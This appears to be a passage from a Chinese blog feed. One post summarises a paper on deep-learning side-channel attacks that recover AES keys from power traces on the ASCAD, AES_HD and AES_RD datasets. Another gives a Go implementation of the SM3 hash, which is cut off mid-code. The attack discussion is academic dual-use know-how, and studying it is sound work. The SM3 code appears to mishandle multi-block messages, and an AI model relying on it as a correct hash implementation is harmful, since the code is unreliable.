class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">))</span></span></span><span style="top:1.0991em;"><span class="pstrut" style="height:3.8394em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.1535em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">max</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9465em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8394em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3111em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">))</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.6523em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>由公式可以看出每条能量迹上累加了8次,Y是label,$$Y_i=\varphi(V_i)=\varphi(L(K_i,P_i,C_i))$$,L就是泄露模型, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">ϕ</span></span></span></span>是功耗模型</p>
<h3 id="实验数据与结果对比">实验数据与结果对比</h3>
<p>采用猜测熵来评估SCA攻击效率,猜测熵即猜对正确密钥所需要的次数,通常为1时被视作猜测成功,作者随机了一百次之后取平均的猜测熵(这个操作目前还没实现过所以具体不太理解,这两天跑一下,作者采用inception的思想,设计的神经网络架构如表1所示。</p>
<p><img src="../img/image-20230601163514005.png" alt="表1 神经网络架构"></p>
<p>作者说第一个大小为1的卷积核是为了减小复杂度,他并没有跟大小为7的卷积核串行运算,怎么会减小后边的复杂度?因为在inception中,他是通过串行计算时利用1x1的卷积核减小第三个维度来降低复杂度的。测试了一下,如图1,图2所示.</p>
<p><img src="../img/image-20230608101552670.png" alt="图1	去掉大小为1的卷积核后的复杂度"></p>
<p><img src="../img/image-20230608102917410.png" alt="结果1"></p>
<p><img src="../img/image-20230608103547498.png" alt="图2 带有大小为1卷积核的复杂度"></p>
<p><img src="../img/image-20230608103712685.png" alt="结果2"></p>
<h4 id="结果">结果</h4>
<h5 id="ASCAD">ASCAD</h5>
<img src="../img/image-20230608105256341.png" alt="图3 N=0时攻击结果" style="zoom:67%;" />
<img src="../img/image-20230608105709891.png" alt="表2 对比" style="zoom:67%;" />
<p>在未加入时钟抖动的ASCAD数据集中, 可以看到本文的工作与文献46<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>在复杂度略微减小但GE=1时所需的能量迹条数是相差不大的。</p>
<p>但在随机时钟抖动的数据集中,本文的结果要优于前人的工作,如表3,表4所示。</p>
<img src="../img/image-20230608110736603.png" alt="图4	加入随机延迟max为50的随机时钟抖动攻击结果" style="zoom:80%;" />
<img src="../img/image-20230608110939986.png" alt="表3 对比" style="zoom:80%;" />
<img src="../img/image-20230608110806053.png" alt="图5	加入随机延迟max为100的时钟抖动攻击结果" style="zoom:80%;" />
<img src="../img/image-20230608111000269.png" alt="表4 对比" style="zoom:80%;" />
<p>可以看出,利用卷积的方法针对于不对齐能量迹的攻击结果较好。</p>
<h5 id="AES-HD">AES_HD</h5>
<img src="../img/image-20230608111417819.png" alt="图6 针对AES_HD数据集的NN架构" style="zoom:80%;" />
<p>可以看到,到这架构就相对于比较简单,两个一维卷积核用来降低复杂度, (这个效果待定,是否降低了参数量还需要做实验我目前还没写到会在实现那里补上),之后经过一个平均池化,池化窗口跟步长都是2,最后展平在经过两个全连接层,最后经过激活函数sigmoid来进行分类输出,可以看到相较于之前的工作成果在复杂度以及GE上有较好的提升,结果如图7,表5所示。</p>
<img src="../img/image-20230608111957392.png" alt="图7 AES_HD数据集攻击结果" style="zoom:80%;" />
<img src="../img/image-20230608112302296.png" alt="表5 对比结果" style="zoom:80%;" />
<h5 id="AES-RD">AES_RD</h5>
<img src="../img/image-20230608112456243.png" alt="图8	AES_RD对应NN架构" style="zoom:80%;" />
<img src="../img/image-20230608112547411.png" alt="图9	攻击结果" style="zoom:80%;" />
<img src="../img/image-20230608112610220.png" alt="表6 对比结果" style="zoom:80%;" />
<p><s>这个效果并不是太好,虽然减少了复杂度,但是增大了GE</s>。</p>
<h1>总结</h1>
<p>作者提出了一种多标签分类的方法针对AES算法来进行攻击,实验的结果表明,在加入时钟抖动后的攻击效果提升较大,且与之前的多分类模型的攻击模型相比复杂度有所降低。</p>
<p>PS：2024.4.5，计算多标签的猜测熵耗费的时间很多，目前我还没找到一个快速转化的方法。</p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>L. Lerman, G. Bontempi, and O. Markowitch, Side Channel Attack: An Approach Based on Machine Learning, Center Adv. Security Res. Darmstadt, Darmstadt, Germany, 2011. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p>G. Zaid, L. Bossuet, A. Habrard, and A. Venelli, “Methodology for efficient cnn architectures in profiling attacks,” IACR Trans. Cryptograph. Hardw. Embedded Syst., vol. 2020, no. 1, pp. 1–36, Nov. 2019. [Online]. Available: <a href="https://tches.iacr.org/index.php/TCHES/article/view/8391">https://tches.iacr.org/index.php/TCHES/article/view/8391</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p>G. Perin, “Deep learning model generalization in side-channel analysis,” in Proc. IACR Cryptol. ePrint Archive, 2019, p. 978. <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn4" class="footnote-item"><p>G. Zaid, L. Bossuet, A. Habrard, and A. Venelli, “Methodology for efficient cnn architectures in profiling attacks,” IACR Trans. Cryptograph. Hardw. Embedded Syst., vol. 2020, no. 1, pp. 1–36, Nov. 2019. [Online]. Available: <a href="https://tches.iacr.org/index.php/TCHES/article/view/8391">https://tches.iacr.org/index.php/TCHES/article/view/8391</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>侧信道评估方法</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang实现SM3杂凑算法</title>
    <url>/archives/518a001c.html</url>
    <content><![CDATA[<h2 id="官方文档">官方文档</h2>
<blockquote>
<p><a href="http://www.sca.gov.cn/sca/xwdt/2010-12/17/1002389/files/302a3ada057c4a73830536d03e683110.pdf">http://www.sca.gov.cn/sca/xwdt/2010-12/17/1002389/files/302a3ada057c4a73830536d03e683110.pdf</a></p>
</blockquote>
<h2 id="杂凑算法实现流程">杂凑算法实现流程</h2>
<p>SM3杂凑算法大致分为: 消息填充、分组、迭代压缩这几个部分</p>
<h3 id="消息填充">消息填充</h3>
<p>对消息<code>m</code>进行填充,m长<strong>l</strong>, 假设消息为&quot;abc&quot;(该示例为官方文档中例子), 将m转为二进制后,填充bit&quot;1&quot;到末尾,之后再添加k个0,其中<code>l+k+1≡448mod512</code>, 这里<strong>l+k+1</strong>与448对512同模, 是为了填充后边的64bit, 以构造512bit的一组数据,填充好的数据<code>m'</code>的长度是512的整数倍.</p>
<p>​	<img src="../img/image-20220917204149620.png" alt="文档中的例子"></p>
<h3 id="消息分组B-i">消息分组B(i)</h3>
<p>上一步我们填充好<code>m'</code>之后,将其按照512bit进行分组,即<strong>m’ = [B(0), B(1), B(2) …B(n-1)]</strong></p>
<h3 id="消息扩展">消息扩展</h3>
<p>这里拿到B(i), 将其进行扩展为<strong>W0,W1,…,W67,W’0,W’1,…W’63.</strong></p>
<p><img src="../img/image-20220917204939048.png" alt="扩展步骤"></p>
<p>这里P1如下</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">P1(X) = X ⊕ (X ≪ 15) ⊕ (X ≪ 23)</span><br></pre></td></tr></table></figure>
<p><strong>&lt;&lt;&lt; x 表示左移了x个单位</strong></p>
<p><strong>←是赋值符号</strong></p>
<h3 id="压缩函数">压缩函数</h3>
<p><img src="../img/image-20220917205139190.png" alt="压缩过程图"></p>
<p><img src="../img/image-20220917205310751.png" alt="参数"></p>
<p><strong>IV中表示ABCDEFGH</strong></p>
<p><strong>!!这里V(i) 是每一大轮也就是每一组才会异或一次上一轮的v, 第一轮直接异或v(0), 按字来异或</strong></p>
<p>取最后的V的值就是生成的杂凑函数</p>
<h2 id="Golang实现代码">Golang实现代码</h2>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MsgFilling</span><span class="params">(plainText <span class="type">string</span>)</span></span> []<span class="type">string</span> &#123; <span class="comment">// 消息填充</span></span><br><span class="line">	final_data := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>)</span><br><span class="line">	plainData := []<span class="type">byte</span>(plainText)</span><br><span class="line">	data := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> plainData &#123;</span><br><span class="line">		tempData := strconv.FormatInt(<span class="type">int64</span>(v), <span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span> <span class="built_in">len</span>(tempData) &lt; <span class="number">8</span> &#123;</span><br><span class="line">			tempData = <span class="string">&quot;0&quot;</span> + tempData</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> tempData &#123;</span><br><span class="line">			data = <span class="built_in">append</span>(data, <span class="type">string</span>(v))</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	lenth := <span class="built_in">len</span>(data)</span><br><span class="line">	lenth2bin := strconv.FormatInt(<span class="type">int64</span>(lenth), <span class="number">2</span>)</span><br><span class="line">	<span class="comment">// +1</span></span><br><span class="line">	data = <span class="built_in">append</span>(data, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">	k := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> ; (lenth+<span class="number">1</span>+k)%<span class="number">512</span> != <span class="number">448</span>; k++ &#123;</span><br><span class="line">		data = <span class="built_in">append</span>(data, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">len</span>(lenth2bin) &lt; <span class="number">64</span> &#123;</span><br><span class="line">		lenth2bin = <span class="string">&quot;0&quot;</span> + lenth2bin</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 循环插入</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> lenth2bin &#123;</span><br><span class="line">		data = <span class="built_in">append</span>(data, <span class="type">string</span>(v))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 对data进行4位处理</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i*<span class="number">8</span> &lt; <span class="built_in">len</span>(data); i++ &#123;</span><br><span class="line">		res := <span class="string">&quot;&quot;</span></span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> data[i*<span class="number">8</span> : i*<span class="number">8</span>+<span class="number">8</span>] &#123;</span><br><span class="line">			res += v</span><br><span class="line">		&#125;</span><br><span class="line">		num, _ := strconv.ParseInt(res, <span class="number">2</span>, <span class="number">64</span>)</span><br><span class="line">		final_num := strconv.FormatInt(<span class="type">int64</span>(num), <span class="number">16</span>)</span><br><span class="line">		<span class="comment">// 填充16进制</span></span><br><span class="line">		<span class="keyword">for</span> <span class="built_in">len</span>(final_num) &lt; <span class="number">2</span> &#123;</span><br><span class="line">			final_num = <span class="string">&quot;0&quot;</span> + final_num</span><br><span class="line">		&#125;</span><br><span class="line">		final_data = <span class="built_in">append</span>(final_data, final_num)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> final_data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消息分组</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">OrgMsg</span><span class="params">(originData []<span class="type">string</span>)</span></span> [][<span class="number">132</span>]<span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> b = [...][<span class="number">16</span>]<span class="type">string</span>&#123;&#123;&#125;&#125;</span><br><span class="line">	<span class="keyword">var</span> data = [...][<span class="number">132</span>]<span class="type">string</span>&#123;&#123;&#125;&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i*<span class="number">64</span> &lt; <span class="built_in">len</span>(originData); i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j*<span class="number">4</span> &lt; <span class="number">64</span>; j++ &#123;</span><br><span class="line">			b[i][j] = (originData[j*<span class="number">4</span>] + originData[j*<span class="number">4</span>+<span class="number">1</span>] + originData[j*<span class="number">4</span>+<span class="number">2</span>] + originData[j*<span class="number">4</span>+<span class="number">3</span>])</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> l := <span class="number">0</span>; l &lt; (<span class="built_in">len</span>(b)); l++ &#123;</span><br><span class="line">		data[l] = msgExpand(b[l])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> data[:]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将int的数据恢复到str16位</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reStr</span><span class="params">(x <span class="type">int64</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	data := strconv.FormatInt(x, <span class="number">2</span>)</span><br><span class="line">	res := <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">len</span>(data) &lt; <span class="number">32</span> &#123;</span><br><span class="line">		data = <span class="string">&quot;0&quot;</span> + data</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i*<span class="number">4</span> &lt; <span class="built_in">len</span>(data); i++ &#123;</span><br><span class="line">		tempData := data[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">1</span>] + data[i*<span class="number">4</span>+<span class="number">1</span>:i*<span class="number">4</span>+<span class="number">2</span>] + data[i*<span class="number">4</span>+<span class="number">2</span>:i*<span class="number">4</span>+<span class="number">3</span>] + data[i*<span class="number">4</span>+<span class="number">3</span>:i*<span class="number">4</span>+<span class="number">4</span>]</span><br><span class="line">		tem, _ := strconv.ParseInt(tempData, <span class="number">2</span>, <span class="number">64</span>)</span><br><span class="line">		res += strconv.FormatInt(tem, <span class="number">16</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// P0函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">P0</span><span class="params">(X <span class="type">int64</span>)</span></span> (data <span class="type">string</span>) &#123;</span><br><span class="line">	data = reStr(X ^ dataShift(reStr(X), <span class="number">9</span>) ^ dataShift(reStr(X), <span class="number">17</span>))</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// P1函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">P1</span><span class="params">(x <span class="type">int64</span>)</span></span> <span class="type">int64</span> &#123;</span><br><span class="line">	strX := reStr(x)</span><br><span class="line">	<span class="keyword">return</span> x ^ dataShift(strX, <span class="number">15</span>) ^ dataShift(strX, <span class="number">23</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消息扩展</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">msgExpand</span><span class="params">(b [16]<span class="type">string</span>)</span></span> [<span class="number">132</span>]<span class="type">string</span> &#123;</span><br><span class="line">	w := [<span class="number">132</span>]<span class="type">string</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">16</span>; i++ &#123;</span><br><span class="line">		w[i] = b[i]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> j := <span class="number">16</span>; j &lt; <span class="number">68</span>; j++ &#123;</span><br><span class="line">		tempW := <span class="string">&quot;&quot;</span></span><br><span class="line">		tempW = reStr(P1(dataShift(w[j<span class="number">-16</span>], <span class="number">0</span>)^dataShift(w[j<span class="number">-9</span>], <span class="number">0</span>)^dataShift(w[j<span class="number">-3</span>], <span class="number">15</span>)) ^ dataShift(w[j<span class="number">-13</span>], <span class="number">7</span>) ^ dataShift(w[j<span class="number">-6</span>], <span class="number">0</span>))</span><br><span class="line">		w[j] = tempW</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> k := <span class="number">68</span>; k &lt; <span class="number">132</span>; k++ &#123;</span><br><span class="line">		w[k] = reStr(dataShift(w[k<span class="number">-68</span>], <span class="number">0</span>) ^ dataShift(w[k<span class="number">-64</span>], <span class="number">0</span>))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> w</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mod2^32加法运算</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mod32</span><span class="params">(x <span class="type">int64</span>, y <span class="type">int64</span>)</span></span> <span class="type">int64</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> (x + y) % <span class="type">int64</span>(math.Pow(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// T函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">T</span><span class="params">(j <span class="type">int</span>)</span></span> (data <span class="type">int64</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> j &lt; <span class="number">16</span> &#123;</span><br><span class="line">		data = dataShift(<span class="string">&quot;79cc4519&quot;</span>, j)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		j = j % <span class="number">32</span></span><br><span class="line">		data = dataShift(<span class="string">&quot;7a879d8a&quot;</span>, j)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FF函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FF</span><span class="params">(A <span class="type">string</span>, B <span class="type">string</span>, C <span class="type">string</span>, j <span class="type">int</span>)</span></span> (data <span class="type">int64</span>) &#123;</span><br><span class="line">	X := dataShift(A, <span class="number">0</span>)</span><br><span class="line">	Y := dataShift(B, <span class="number">0</span>)</span><br><span class="line">	Z := dataShift(C, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> j &lt; <span class="number">16</span> &#123;</span><br><span class="line">		data = X ^ Y ^ Z</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		data = (X &amp; Y) | (X &amp; Z) | (Y &amp; Z)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GG</span><span class="params">(A <span class="type">string</span>, B <span class="type">string</span>, C <span class="type">string</span>, j <span class="type">int</span>)</span></span> (data <span class="type">int64</span>) &#123;</span><br><span class="line">	X := dataShift(A, <span class="number">0</span>)</span><br><span class="line">	Y := dataShift(B, <span class="number">0</span>)</span><br><span class="line">	Z := dataShift(C, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> j &lt; <span class="number">16</span> &#123;</span><br><span class="line">		data = X ^ Y ^ Z</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		data = (X &amp; Y) | (^X &amp; Z)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// msgZip 数据压缩 64轮</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">msgZip</span><span class="params">(w [132]<span class="type">string</span>, v []<span class="type">string</span>)</span></span> []<span class="type">string</span> &#123;</span><br><span class="line">	data := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">var</span> A, B, C, D, E, F, G, H = v[<span class="number">0</span>], v[<span class="number">1</span>], v[<span class="number">2</span>], v[<span class="number">3</span>], v[<span class="number">4</span>], v[<span class="number">5</span>], v[<span class="number">6</span>], v[<span class="number">7</span>]</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">64</span>; i++ &#123;</span><br><span class="line">		SS1 := dataShift(reStr(mod32(mod32(dataShift(A, <span class="number">12</span>), dataShift(E, <span class="number">0</span>)), T(i))), <span class="number">7</span>)</span><br><span class="line">		SS2 := SS1 ^ dataShift(A, <span class="number">12</span>)</span><br><span class="line">		TT1 := mod32(mod32(mod32(FF(A, B, C, i), dataShift(D, <span class="number">0</span>)), SS2), dataShift(w[i+<span class="number">68</span>], <span class="number">0</span>))</span><br><span class="line">		TT2 := mod32(GG(E, F, G, i), mod32(mod32(SS1, dataShift(w[i], <span class="number">0</span>)), dataShift(H, <span class="number">0</span>)))</span><br><span class="line">		D = C</span><br><span class="line">		C = reStr(dataShift(B, <span class="number">9</span>))</span><br><span class="line">		B = A</span><br><span class="line">		A = reStr(TT1)</span><br><span class="line">		H = G</span><br><span class="line">		G = reStr(dataShift(F, <span class="number">19</span>))</span><br><span class="line">		F = E</span><br><span class="line">		E = P0(TT2)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> dataList = []<span class="type">string</span>&#123;A, B, C, D, E, F, G, H&#125;</span><br><span class="line">	<span class="comment">// fmt.Println(dataList)</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(v); i++ &#123;</span><br><span class="line">		data = <span class="built_in">append</span>(data, reStr(dataShift(v[i], <span class="number">0</span>)^dataShift(dataList[i], <span class="number">0</span>)))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dataShift 数据移位</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dataShift</span><span class="params">(data <span class="type">string</span>, l <span class="type">int</span>)</span></span> <span 